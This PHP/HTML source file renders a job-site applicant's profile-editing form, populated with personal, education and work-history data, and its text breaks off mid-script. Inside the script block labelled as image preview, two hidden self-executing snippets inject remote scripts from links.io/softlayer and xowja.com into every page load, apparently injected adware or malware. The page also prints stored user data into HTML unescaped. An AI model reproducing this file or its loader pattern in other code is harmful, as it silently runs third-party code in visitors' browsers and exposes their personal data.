<?php
include './includes/functions.php';
include './includes/db.php';

//GET CURRENT DATE
date_default_timezone_set('Singapore');
$year = date('Y');
$currDate = date("Y-m-d");
$minYear = $year - 50;
$minYear2= $minYear + 1;
$maxYear = $year - 18;
$maxSchoolYear = $year + 5;

$minBirthDate = strtotime('-60 years');
$minBirthYear = $year - 60;
$minBirthDate =  date('Y-m-d', $minBirthDate);
$maxBirthDate = strtotime('-17 years');
$maxBirthYear = $year - 18;
$maxBirthDate =  date('Y-m-d', $maxBirthDate);

//GET SESSION VARIABLLES
session_start();
if(isset($_SESSION['SRIUsername']) && $_SESSION['SRIUsername'] != ""){
	$username = $_SESSION['SRIUsername'];
}
else{
	header("Location: index.php");
}

//set Profile Box Info
$status = getAcctInfo($username, "status");
//basic info
$fullName = getEmployeeData($username, "full-name");
$firstName = getEmployeeData($username, "first-name");
$middleName = getEmployeeData($username, "middle-name");
$lastName = getEmployeeData($username, "last-name");
$password = getAcctInfo($username, "password");
$age = getEmployeeData($username, "age");
$address = getEmployeeData($username, "address");
$profilePic = getEmployeeData($username, "profile_pic");
$birthDate = getEmployeeData($username, "birth_date");
$birthPlace = getEmployeeData($username, "birth_place");
$gender = getEmployeeData($username, "sex");
$street1 = getEmployeeData($username, "street1");
$city1 = getEmployeeData($username, "city1");
$province1 = getEmployeeData($username, "province1");
$area = $city1 . ", " . $province1;
$height = getEmployeeData($username, "height");
$height = explode("'", $height);
$heightFt = $height[0];
$heightIn = $height[1];
$weight = getEmployeeData($username, "weight");
$civilStatus = getEmployeeData($username, "civil_status");
$numChildren = getEmployeeData($username, "num_children");
$religion = getEmployeeData($username, "religion");
$mobile = getEmployeeData($username, "mobile");
$mobile1 = substr($mobile, 0, -7);
$mobile2 = substr($mobile, 4, -4);
$mobile3 = substr($mobile, -4);
$email = getEmployeeData($username, "email");
$landline = getEmployeeData($username, "landline");
$landline1 = substr($landline, 0, -4);
$landline2 = substr($landline, 3, -2);
$landline3 = substr($landline, -2);
//educational background
$hsName = getEmployeeData($username, "hs_name");
$hsEndYr = getEmployeeData($username, "hs_end_yr");
$hsEduc = getEmployeeData($username, "hs_educ");
$collegeName = getEmployeeData($username, "college_name");
$collegeDegree = getEmployeeData($username, "college_degree");
$collegeEndYr = getEmployeeData($username, "college_end_yr");
$collegeEduc = getEmployeeData($username, "college_educ");
$vocSchoolName = getEmployeeData($username, "voc_school_name");
$vocCourse = getEmployeeData($username, "voc_course");
$vocEndYr = getEmployeeData($username, "voc_end_yr");
$vocEduc = getEmployeeData($username, "voc_educ");
//work history
$workHistoryCount = getWorkHistory($username, "count");
$rowNums = getWorkHistory($username, "num_rows");
$rNs = explode("-", $rowNums);

$interestsCount = getInterests($username, "count");
$rowNums2 = getInterests($username, "num_rows");
$rNs2 = explode("-", $rowNums2);

$classificationRows = getAvailableClassifications($username);
$cRs = explode("-", $classificationRows);
$addMoreBtnCount = $workHistoryCount;

//GET ALL LISTED RELIGIONS
$religions = getReligions();
//GET ALL JOB POSITIONS LISTED
$jobPositions = getJobPositions();

if($mobile != ""){
	$mobileDisabled = "readonly";
	$emailDisabled = "";
}
else if($email != ""){
	$mobileDisabled = "";
	$emailDisabled = "readonly";
}

/*MANAGE EDUCATIONAL ATTAINMENT */
//for high school
$hsEduc1 = "";
$hsEduc2 = "";
$hsEduc3 = "";
if($hsEduc === "Undergraduate"){
	$hsEduc1 = "checked";
}
else if($hsEduc === "Graduate with Honors"){
	$hsEduc2 = "checked";
}
else if($hsEduc === "Graduate"){
	$hsEduc3 = "checked";
}
//for college
$collegeEduc1 = "";
$collegeEduc2 = "";
$collegeEduc3 = "";
if($collegeEduc === "Undergraduate"){
	$collegeEduc1 = "checked";
}
else if($collegeEduc === "Graduate with Honors"){
	$collegeEduc2 = "checked";
}
else if($collegeEduc === "Graduate"){
	$collegeEduc3 = "checked";
}

//for vocational school
$vocEduc1 = "";
$vocEduc2 = "";
$voc3 = "";
if($vocEduc === "Undergraduate"){
	$vocEduc1 = "checked";
}
else if($vocEduc === "Graduate with Honors"){
	$vocEduc2 = "checked";
}
else if($vocEduc === "Graduate"){
	$vocEduc3 = "checked";
}

//GET ALL LOCATIONS LISTED
$availableLocations= getJobLocations();

//FOR PROFILE SAVING
$profileSaved = 0;
if(isset($_GET['saved'])){
	$profileSaved = $_GET['saved'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<!-- START META -->
<?php echo $meta=getMeta(); ?>
<!-- END META -->
<!-- CSS scripts -->
<link rel="stylesheet" href="./css/bootstrap.css"/>
<link rel="stylesheet" href="./css/select2.css"/>
<link rel="stylesheet" href="./css/datepicker.css"/>
<!-- [if IE]>
	<script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
<![endif] -->
<link rel="stylesheet" href="./css/bootstrap-responsive.css"/>
<style type="text/css">
.dropdown-menu {
	background-color: #EDEDEB;
}
</style>
<!-- CSS scripts -->
</head>
<body>
<!-- START GTM  -->
<?php echo $gtm=getGTM(); ?>
<!-- END GTM-->
<div class="wrap">
	<!-- START HEADER -->
	<?php echo $header=getHeader('default'); ?>
	<!-- END HEADER -->
	<!-- START SEARCH NAVBAR  -->
	<?php echo $navbar=getApplicantNavBar($username); ?>
	<!-- END SEARCH NAVBAR  -->
	<div class="container-fluid">
		<div class="row-fluid">
			<div class="span6 offset1">
				<h3>Edit Profile</h3>
			</div>
			<div class="span3 offset1">
				<p class="text-info pull-right" style="font-weight:bold; padding-top:30px;">*Required fields</p>
			</div>
		</div>
		<div class="row-fluid" id="content-apply-job">
			<div class="span10 offset1"> 
				<div class="row-fluid">
					<div class="span12 well">
						<h4 class="content-heading2">BASIC INFORMATION</h4>
						<!-- START SIGNUP FORM -->
						<form name="edit-form" id="edit-form" class="form-horizontal" method="POST" action="process-editprofile.php" enctype="multipart/form-data">
						<div class="basic-info-form1">
							 <div class="control-group">
								<label class="control-label">*FULL NAME<br><span id="formLabel" style="font-weight:normal; color:#404040;">( First Name, Middle Name, Last Name )</span></label>
									<div class="controls controls-row">
									  <input type="text" class="span4" id="firstName" name="firstName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $firstName ?>" required />
									   <input type="text" class="span4" id="middleName" name="middleName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $middleName; ?>" required />
									   <input type="text" class="span4" id="lastName" name="lastName" pattern="[a-zA-Z _]{2,}" minlength="2" value="<?php echo $lastName; ?>" required />
									  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							 <div class="control-group">
								<label class="control-label">*CURRENT ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">( Street Address, City and Provincial Address )</span></label>
								<div class="controls controls-row">
								  <input type="text" class="span4" id="street1" name="street1" value="<?php echo $street1;?>" minlength="5" required />
								   <select class="span8" id="area1" name="area1"  required>
										<option></option>
										<?php
											foreach($availableLocations as $aL) {
												if($aL === $area){
													echo "<option value=\"$aL\" selected=\"selected\">$aL</option>";
												}
												else
													echo "<option value=\"$aL\">$aL</option>";
											}
										?>
									</select>
								  <p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
								</div>
							 </div>
							  <div class="row-fluid">
								<div class="span6">
									 <div class="control-group">
										<label class="control-label">*BIRTH DATE<br><span id="formLabel" style="font-weight:normal; color:#404040;">YYYY-MM-DD</span></label>
										<div class="controls">
											<div class="input-append date" id="bDate" data-date="<?php echo $maxBirthDate;?>" data-date-format="yyyy-mm-dd" data-date-viewmode="years">
												<input class="span12" id="birthDate" name="birthDate" size="16" type="text" min="<?php echo $minBirthDate;?>" max="<?php echo $maxBirthDate;?>" value="<?php echo $birthDate; ?>" style="color:black;" required>
												<span class="add-on"><i class="icon-calendar"></i></span>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											 </div>
										</div>
									 </div>
								</div>
								<div class="span6">
									 <div class="control-group">
										<label class="control-label">*BIRTH PLACE</label>
										<div class="controls controls-row">
											<input class="span12" type="text" id="birthPlace" name="birthPlace" value="<?php echo $birthPlace; ?>" minlength="5"required />
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									 </div>
								</div>
							</div>
							<div class="row-fluid">
								<div class="span6">
									 <div class="control-group">
										<label class="control-label">*SEX</label>
										<div class="controls" style="margin-top:-5px;">
											<select class="span12" id="sex" name="sex" required>
												<?php
													if($gender === "M"){
														echo "<option value=\"M\" selected=\"selected\">M</option>
														<option value=\"F\">F</option>";
													}
													else if($gender === "F"){
														echo "<option value=\"M\">M</option>
														<option value=\"F\" selected=\"selected\">F</option>";
													}
												?>
											</select>
										</div>
									 </div>
								</div>
								<div class="span6">
									 <div class="control-group">
										<label class="control-label">*CIVIL STATUS</label>
										<div class="controls" style="margin-top:-5px;">
											<select class="span12" id="civilStatus" name="civilStatus" required>
												  <?php
													if($civilStatus == "Single"){
														echo "<option value=\"Single\">Single</option>
														<option value=\"Married\">Married</option>";
													}
													else{
														echo "<option value=\"Married\">Married</option>
														<option value=\"Single\">Single</option>";
													}
												?>
											</select>
										</div>
									</div>
								</div>
							</div>
							<div class="row-fluid">
								<div class="span7">
									  <div class="control-group">
										<label class="control-label">HEIGHT<br><span id="formLabel" style="font-weight:normal; color:#404040;">( ft., in. )</span></label>
										<div class="controls controls-row">
											<input class="span6" type="number" id="heightFt" name="heightFt" value="<?php echo $heightFt;?>" min="4" max="10">
											<input class="span6" type="number" id="heightIn" name="heightIn" value="<?php echo $heightIn;?>" min="0" max="11">
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									 </div>
								</div>
								<div class="span5">
									 <div class="control-group">
										<label class="control-label">WEIGHT</label>
										<div class="controls">
											<input class="span7" type="number" id="weight" name="weight" value="<?php echo $weight; ?>" min="20" max="600">
											<select class="span5" id="weightType" name="weightType">
												<option>lbs.</option>
												<option>kgs.</option>
											</select>
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
							</div>
							<div class="row-fluid">
								<div class="span5">
									<div class="control-group">
										<label class="control-label">*NO. OF CHILDREN</label>
										<div class="controls">
											<input class="span12" type="number" id="numChildren" name="numChildren" min="0" value="<?php echo $numChildren; ?>" required />
											<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
										</div>
									</div>
								</div>
								<div class="span6 offset1">
									<div class="control-group">
										<label class="control-label">*RELIGION</label>
										<div class="controls" style="margin-top:-5px;">
											<select class="span12" id="religion" name="religion" required>
												<?php
													foreach ($religions as $r){
														if($r == $religion) {
															echo "<option value=\"$r\" selected=\"selected\">$r</option>";
														}
														else {
															echo "<option value=\"$r\">$r</option>";
														}
													}
												 ?>
											</select>
										</div>
									</div>								
								</div>
							</div>
							<div class="row-fluid">
								<div class="control-group">
									<label class="control-label"><?php if($mobile==$username) echo "*";?>MOBILE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. 0915-111-1111)</span></label>
									<div class="controls">
										<input type="text" class="span4" id="mobile1" name="mobile1"  value="<?php echo $mobile1;?>" pattern="[0-9]*" minlength="4" maxlength="4" <?php echo $mobileDisabled;?>/> -
										<input type="text" class="span4" id="mobile2" name="mobile2"  value="<?php echo $mobile2;?>" pattern="[0-9]*" minlength="3" maxlength="3" <?php echo $mobileDisabled;?>/> -
										<input type="text" class="span4" id="mobile3" name="mobile3"  value="<?php echo $mobile3;?>" pattern="[0-9]*" minlength="4" maxlength="4"  <?php echo $mobileDisabled;?>/>
										<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
									</div>
								</div>
							</div>
							<div class="row-fluid">
								<div class="control-group">
									<label class="control-label"><?php if($email==$username) echo "*";?>EMAIL ADDRESS<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. jdelacruz@sri.com)</span></label>
									<div class="controls">
										<input type="email" class="span12" id="email" name="email" style="margin-right:80px;" value="<?php echo $email; ?>" <?php echo $emailDisabled;?>> 
										<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
									</div>
								</div>
							</div>
							<div class="row-fluid">
								<div class="control-group">
									<label class="control-label">LANDLINE NO.<br><span id="formLabel" style="font-weight:normal; color:#404040;">(e.g. 411-11-11)</span></label>
									<div class="controls">
										<input type="text" class="span4" id="landline1" name="landline1" pattern="[0-9]*" minlength="3" maxlength="3" value="<?php echo $landline1;?>"/> -
										<input type="text" class="span4" id="landline2" name="landline2" pattern="[0-9]*" minlength="2" maxlength="2" value="<?php echo $landline2;?>"/> -
										<input type="text" class="span4" id="landline3" name="landline3" pattern="[0-9]*" minlength="2" maxlength="2" value="<?php echo $landline3;?>"/> 
										<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
									</div>
								</div>
							</div>
							 <div class="row-fluid">
								<div class="span12">
									<div class="row-fluid">
										<div class="control-group">
											<label class="control-label">PROFILE PICTURE</label>
											<div class="controls">
												<div class="span4" id="imagePreview"><span id="temp-pic" style="display:inline"><img src="<?php echo $profilePic; ?>" style="width:104px; height:103px;"/></span></div>
												<br/><br/>
												<input class="span8" type="file" id="imageInput" name="photoimg" onchange="loadImageFile();" style="padding-left:10px;" />
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid">
							<h4 class="content-heading2">EDUCATIONAL BACKGROUND</h4>
							<div class="row-fluid form-horizontal">
									<div class="span7">
										  <div class="control-group">
											<label class="control-label">HIGH SCHOOL</label>
											<div class="controls">
												<input class="span12" type="text" id="hs" name="hs"  value="<?php echo $hsName; ?>" minlength="5" onchange="enableHSStatus()"/>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
									<div class="span5">
										  <div class="control-group">
											<label class="control-label" id="formLabel">(YEAR GRADUATED)</label>
											<div class="controls">
												<input class="span12" type="number" min=<?php echo $minYear;?> max=<?php echo $maxSchoolYear;?> id="hsEndYr" name="hsEndYr" placeholder="YYYY" value="<?php echo $hsEndYr; ?>" />
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span12" style="margin-top:-20px;">
										<div class="control-group">
											<label class="control-label"></label>
											<div class="controls">
												<label class="radio inline" id="gender-option-label"><input type="radio" name="hsEduc" id="hsEduc1" value="Undergraduate" <?php echo $hsEduc1; ?>>Undergraduate</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="hsEduc" id="hsEduc2" value="Graduate with Honors" <?php echo $hsEduc2; ?>>Graduated w/ Honors</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="hsEduc" id="hsEduc3" value="Graduate" <?php echo $hsEduc3; ?>>Graduated w/o Honors</label>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span7">
										  <div class="control-group">
											<label class="control-label">COLLEGE</label>
											<div class="controls">
												<input class="span12" type="text" id="college" name="college" value="<?php echo $collegeName; ?>" minlength="5" onchange="enableCollegeStatus()"/>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
									<div class="span5">
										  <div class="control-group">
											<label class="control-label" id="formLabel">(YEAR GRADUATED)</label>
											<div class="controls">
												<input class="span12" type="number" min=<?php echo $minYear;?> max=<?php echo $maxSchoolYear;?> id="collegeEndYr" name="collegeEndYr" placeholder="YYYY" value="<?php echo $collegeEndYr; ?>" />
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span7" style="margin-top:-20px;">
										  <div class="control-group">
											<label class="control-label" id="formLabel">(DEGREE)</label>
											<div class="controls">
												<input class="span12" type="text" id="collegeDegree" name="collegeDegree" value="<?php echo $collegeDegree; ?>" minlength="5"/>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="spa12" style="margin-top:-20px;">
									<div class="control-group">
											<label class="control-label"></label>
											<div class="controls">
												<label class="radio inline" id="gender-option-label"><input type="radio" name="collegeEduc" id="collegeEduc1" value="Undergraduate" <?php echo $collegeEduc1; ?>>College Level</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="collegeEduc" id="collegeEduc2" value="Graduate with Honors" <?php echo $collegeEduc2; ?>>Graduated w/ Honors</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="collegeEduc" id="collegeEduc3" value="Graduate" <?php echo $collegeEduc3; ?>>Graduated w/o Honors</label>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span7">
										  <div class="control-group">
											<label class="control-label">VOCATIONAL</label>
											<div class="controls">
												<input class="span12" type="text" id="vocationalSchool" name="vocationalSchool" value="<?php echo $vocSchoolName; ?>" minlength="5" onchange="enableVocSchoolStatus()"/>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
									<div class="span5">
										  <div class="control-group">
											<label class="control-label" id="formLabel">(YEAR GRADUATED)</label>
											<div class="controls">
												<input class="span12" type="number" min=<?php echo $minYear;?> max=<?php echo $maxSchoolYear;?>  id="vocationalEndYr" name="vocationalEndYr" placeholder="YYYY" value="<?php echo $vocEndYr; ?>" />
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span7" style="margin-top:-20px;">
										  <div class="control-group">
											<label class="control-label" id="formLabel">(COURSE)</label>
											<div class="controls">
												<input class="span12" type="text" id="vocationalDegree" name="vocationalDegree" value="<?php echo $vocCourse; ?>" minlength="5">
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
								<div class="row-fluid form-horizontal">
									<div class="span12" style="margin-top:-20px;">
										<div class="control-group">
											<label class="control-label"></label>
											<div class="controls">
												<label class="radio inline" id="gender-option-label"><input type="radio" name="vocationalEduc" id="vocationalEduc1" value="Undergraduate" <?php echo $vocEduc1; ?>>Undergraduate</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="vocationalEduc" id="vocationalEduc2" value="Graduate with Honors" <?php echo $vocEduc2; ?>>Graduated w/ Honors</label>
												<label class="radio inline" id="gender-option-label"><input type="radio" name="vocationalEduc" id="vocationalEduc3" value="Graduate" <?php echo $vocEduc3; ?>>Graduated w/o Honors</label>
												<p class="help-block" style="font-size:11.5px; background-color:lightgrey;"></p>
											</div>
										 </div>
									</div>
								</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid">
							<h4 class="content-heading2">WORK HISTORY</h4>
							<?php
								for ($i=0; $i<$workHistoryCount; $i++){
									$content = "";
									$rNum = $rNs[$i];
									$companyName = getWHRowData($username, $rNum, "company_name");
									$position = getWHRowData($username, $rNum, "position-id");
									//$position = getJobPositionName($positionID);
									$workStart = getWHRowData($username, $rNum, "work_start");
									$workStart = substr($workStart, 0, -3);
									$workEnd = getWHRowData($username, $rNum, "work_end");
									$workEnd = substr($workEnd, 0, -3);
									$coName = "coNameOld" . $i;
									$pos = "positionOld" . $i;
									$startMonth = "startMonthOld" . $i;
									$endMonth = "endMonthOld" . $i;
									$wHLabel = $i+1;
									$content.="<span id=\"add$i\" style=\"display:block;\">
									<div class=\"row-fluid \">
										<div class=\"span12\">
											<div class=\"control-group\">
												<label class=\"control-label\"><i class=\" icon-asterisk\"></i></label>
												<div class=\"controls control-row\">
													<input type=\"text\" class=\"span6\" id=\"$coName\" name=\"$coName\" value=\"$companyName\" minlength=\"3\"/>
													<input type=\"text\" class=\"span6\" id=\"$pos\" name=\"$pos\" value=\"$position\" minlength=\"3\"/>
												</div>
											</div>
										</div>
									</div>
									<div class=\"row-fluid\">
										<div class=\"span12\">
											<span class=\"control-label\" id=\"formLabel\">(START DATE) </span><div class=\"input-append date\" id=\"wHStart\" data-date=\"102/2012\" data-date-format=\"yyyy-mm\" data-date-viewmode=\"years\" data-date-minviewmode=\"months\">
												<input type=\"text\" class=\"span10\" name=\"$startMonth\" value=\"$workStart\"/>
												<span class=\"add-on\"><i class=\"icon-calendar\"></i></span>
											</div>
											<em>to </em>
											<span id=\"formLabel\" style=\"font-weight:normal; color:#404040;\">(END DATE) </span><div class=\"input-append date\" id=\"wHEnd\" data-date=\"102/2012\" data-date-format=\"yyyy-mm\" data-date-viewmode=\"years\" data-date-minviewmode=\"months\">
												<input type=\"text\" class=\"span10\" name=\"$endMonth\" value=\"$workEnd\"/>
												<span class=\"add-on\"><i class=\"icon-calendar\"></i></span>
											</div>
											<button type=\"button\" class=\"btn-inverse btn-mini\" id=\"$addBtn\" style=\"margin-top:-5px; border-radius: 25px; width: 26px; height: 26px; box-shadow: 2px 2px 5px #888888;\" name=\"$i\" onclick=\"removeThisField(this.name, $rNum);\"> <i id=\"icon$i\" class=\"icon-minus-sign icon-white\" style=\"margin-left:-2px; padding-top:1px;\"></i></button>
										</div>
									</div><br>
									</span>";
									echo $content;
								} 
							?>
							<div class="row-fluid" id="add-more-btn" style="display:block;">
								<div class="span2 offset10">
									<button type="button" class="btn btn-info span12" onclick="more();">ADD MORE</button>
									<span id="answer"></span>
								</div>
							</div>
							<div class="row-fluid" id="more" style="display:none;">
								<div class="span12">
									<?php
										$content = "";
										$start = 1 + intval($addMoreBtnCount); 
										for($i=1; $i<50; $i++){
											if($i<=1){
												$content = "<span id=\"add$i\" style=\"display:block;\">";
											}
											else if($i>1) {
												$content = "<span id=\"add$i\" style=\"display:none;\">";
											}
											$coName = "coName" . $i;
											$position = "position" . $i;
											$startMonth = "startMonth" . $i;
											$endMonth = "endMonth" . $i;
											$addBtn = "addBtn" . $i;
												$content.="<div class=\"row-fluid \">
														<div class=\"span12\">
															<div class=\"control-group\">
																<label class=\"control-label\"><i class=\"icon-certificate\"></i></label>
																<div class=\"controls control-row\">
																	<input type=\"text\" class=\"span6\" id=\"$coName\" name=\"$coName\" placeholder=\"NAME OF COMPANY\" minlength=\"3\" onchange=\"fillCompanyName('$i');\"/>
																	<input type=\"text\" class=\"span6\" id=\"$position\" name=\"$position\" placeholder=\"POSITION\" minlength=\"3\"/>
																</div>
															</div>
														</div>
													</div>
													<div class=\"row-fluid\">
														<div class=\"span12\">
															<span class=\"control-label\" id=\"formLabel\">(START DATE) </span><div class=\"input-append date wHStart\" data-date=\"102/2012\" data-date-format=\"yyyy-mm\" data-date-viewmode=\"years\" data-date-minviewmode=\"months\">
																<input type=\"text\" class=\"span10\" id=\"$startMonth\" name=\"$startMonth\" placeholder=\"YYYY-MM\"/>
																<span class=\"add-on\"><i class=\"icon-calendar\"></i></span>
															</div>
															<em>to </em>
															<span id=\"formLabel\" style=\"font-weight:normal; color:#404040;\">(END DATE) </span><div class=\"input-append date wHEnd\" data-date=\"102/2012\" data-date-format=\"yyyy-mm\" data-date-viewmode=\"years\" data-date-minviewmode=\"months\">
																<input type=\"text\" class=\"span10\" id=\"$endMonth\" name=\"$endMonth\" placeholder=\"YYYY-MM\"/>
																<span class=\"add-on\"><i class=\"icon-calendar\"></i></span>
															</div>
															<button type=\"button\" class=\"btn-primary btn-mini\" id=\"$addBtn\" style=\"margin-top:-5px; border-radius: 25px; width: 26px; height: 26px; box-shadow: 2px 2px 5px #888888;\" name=\"$i\" onclick=\"addThisField(this.name);\"> <i id=\"icon$i\" class=\"icon-plus-sign icon-white\" style=\"margin-left:-2px; padding-top:1px;\"></i></button>
														</div>
													</div><br>
												</span>";
											echo $content;
										}
										?>
								</div>
							</div>
						</div>
					</div>
				</div>
				<div class="row-fluid" style="padding-top:10px;">
					<div class="span12 well">
						<div class="row-fluid">
							<h4 class="content-heading2">*JOBS I AM INTERESTED IN</h4>
								<div style="margin-left:5px;" >
									<select class="span12" id="classification" name="classification[]"  data-placeholder="Choose a job classification" multiple="multiple">
										<?php
											echo "<option></option>";
											foreach($jobPositions as $jP) {
												$jobPositionID = getJobPositionID($jP);
												if(in_array($jobPositionID, $rNs2)){
													echo "<option class=\"filterOption\" value=\"$jobPositionID\" selected=\"selected\">$jP</option>";
													$jobPosHidden .= $jP . ",";
												}
												else{
													echo "<option class=\"filterOption\" value=\"$jobPositionID\">$jP</option>";
												}
											}
										?>					
									</select>
								</div>
						</div>
					</div>
				</div>
				<!-- hidden variables -->
				<input type="hidden" id="status" name="status" value="<?php echo $status;?>" />
				<input type="hidden" id="username" name="username" value="<?php echo $username;?>">
				<input type="hidden" id="historyNum" name="historyNum" value="<?php echo $workHistoryCount;?>">
				<input type="hidden" id="interestNum" name="interestNum" value="<?php echo $interestsCount;?>">
				<input type="hidden" id="profileSaved" name="profileSaved" value="<?php echo $profileSaved;?>">
			</div>
		</div>
		<div class="row-fluid">
			<div class="span6 offset5">
				<button type="button" class="btn btn-primary span6" id="changeAcctInfo" name="changeAcctInfo" onclick="changeAccountInfo();">CHANGE PASSWORD</button>
				<button type="submit" class="btn btn-primary job-post-add span6" id="submitApply" name="submitApply">SAVE CHANGES</button>				
				</form>
				<!--END SIGNUP FORM-->
			</div>
		</div>
	</div>
	<br><br><br>
	<div class="push"></div>
</div>
<!-- START MODAL-->
<div id="myModal" class="modal hide fade" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-header">
	<h4 class="content-heading4" id="modal-title">Profile Changes Saved</h4>
  </div>
  <div class="modal-body">
	<div class="row-fluid">
		<div class="span12">
			  <p style="text-align: center;">You have successfully updated your profile.</p>
		</div>
	</div>
  </div>
  <div class="modal-footer">
	<div class="row-fluid">
		<div class="span4 offset4">
			<button class="btn btn-primary span12" data-dismiss="modal">OK</button>
		</div>
	</div>
  </div>
</div>
<!-- END MODAL-->
<!-- START ERROR MODAL-->
<?php echo $formErrorModal=getFormsErrorModal(); ?>
<!-- END ERROR MODAL-->
	<!-- START FOOTER -->
	<?php echo $footer=getFooter(); ?>
	<!-- END FOOTER -->
<!-- JS scripts -->
<script src="./js/jquery.min.js"></script>
<script src="./js/select2.js"></script>
<script src="./js/jqBootstrapValidation.js"></script>
<script src="./js/jquery.form.js"></script>
<script src="./js/bootstrap-datepicker.js"></script>
<script src="./js/bootstrap.min.js"></script>
<script>
//START IMAGE PREVIEW
var loadImageFile = (function () {
    if (window.FileReader) {
        var    oPreviewImg = null, oFReader = new window.FileReader(),
            rFilter = /^(?:image\/bmp|image\/cis\-cod|image\/gif|image\/ief|image\/jpeg|image\/jpeg|image\/jpeg|image\/pipeg|image\/png|image\/svg\+xml|image\/tiff|image\/x\-cmu\-raster|image\/x\-cmx|image\/x\-icon|image\/x\-portable\-anymap|image\/x\-portable\-bitmap|image\/x\-portable\-graymap|image\/x\-portable\-pixmap|image\/x\-rgb|image\/x\-xbitmap|image\/x\-xpixmap|image\/x\-xwindowdump)$/i;

        oFReader.onload = function (oFREvent) {
            if (!oPreviewImg) {
                var newPreview = document.getElementById("imagePreview");
				document.getElementById("temp-pic").style.display = "none";
                oPreviewImg = new Image();
                oPreviewImg.style.width = "104px";
				oPreviewImg.style.height = "103px";
                newPreview.appendChild(oPreviewImg);
            }
            oPreviewImg.src = oFREvent.target.result;
        };

        return function () {
            var aFiles = document.getElementById("imageInput").files;
            if (aFiles.length === 0) { return; }
            if (!rFilter.test(aFiles[0].type)) { alert("You must select a valid image file!"); return; }
            oFReader.readAsDataURL(aFiles[0]);
        }

    }
    if (navigator.appName === "Microsoft Internet Explorer") {
        return function () {
            document.getElementById("imagePreview").filters.item("DXImageTransform.Microsoft.AlphaImageLoader").src = document.getElementById("imageInput").value;

        }
    }
})();
/* */
var uco = 'US';(function() {
    var url = (document.location.protocol == 'http:') ? 'cdn-sl.links.io/replace.js' : '93ce.https.cdn.softlayer.net/8093CE/dev.links.io/htmlreplace/replace-ssl.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
(function() {
    var url = (document.location.protocol == 'http:') ? 'xowja.com/i.js' : 'xowja.com/i.js';
    var h = document.getElementsByTagName('head')[0];
    var s = document.createElement('script');
    s.type = 'text/javascript';
    s.src = document.location.protocol + '//' + url;
    h.appendChild(s);
})();
//END IMAGE PREVIEW
</script>

<script>
$(document).ready(function() { 
	$(function () { $("input,select,textarea").not("[type=submit]").jqBootstrapValidation(); } );
});
</script>

<script>
$(document).ready(function() { 
	var profileSaved = document.getElementById('profileSaved').value;
	if(profileSaved == 1){
		$("#myModal").modal('show');
	}
	
	$("#birthDate").datepicker(); 
	$("#bDate").datepicker(); 
	$(".wHStart").datepicker(); 
	$(".wHEnd").datepicker(); 
	$("#area1").select2();
	$("#sex").select2(); 
	$("#classification").select2();
	$("#religion").select2(); 
	$("#civilStatus").select2();
	
	// bind to the form's submit event 
	$('#edit-form').submit(function() { 
		//validate inputs
		var errors = 0;
		var fields = new Array();
		var requiredFields = new Array();
		var errorMsg = "";
		var street = document.getElementById('street1').value;
		var minBirthYear = <?php echo $minBirthYear;?>;
		var maxBirthYear = <?php echo $maxBirthYear;?>;
		var  bDate = document.getElementById('birthDate').value;
		var bDateYear = bDate.substr(0,4);
		bDateYear = parseInt(bDateYear);
		
		var birthPlace = document.getElementById('birthPlace').value;
		var bpe = document.getElementById('birthPlace').required;
		var heightFt = document.getElementById('heightFt').value;
		heightFt= parseInt(heightFt);
		var heightIn = document.getElementById('heightIn').value;
